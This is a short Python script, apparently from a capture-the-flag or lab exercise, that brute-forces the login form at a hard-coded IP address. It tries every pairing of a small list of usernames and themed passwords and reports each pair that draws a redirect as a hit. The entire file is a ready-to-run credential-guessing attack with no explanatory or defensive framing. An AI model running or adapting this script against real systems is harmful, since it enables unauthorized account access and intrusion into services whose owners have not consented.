import requests

users = ["operator", "admin", "commander", "root", "rf_admin", "revolutionary", "sector07"]
passwords = ["password", "admin", "operator123", "revolution", "silence", "sector07",
             "thesilenceendstonight", "reactor", "commandnetwork", "letmein", "changeme"]

for u in users:
    for p in passwords:
        r = requests.post("http://52.66.177.113/login.php",
                           data={"username": u, "password": p},
                           allow_redirects=False)
        if r.status_code == 302:
            print(f"HIT: {u}/{p} -> {r.headers.get('Location')}")
print("done")
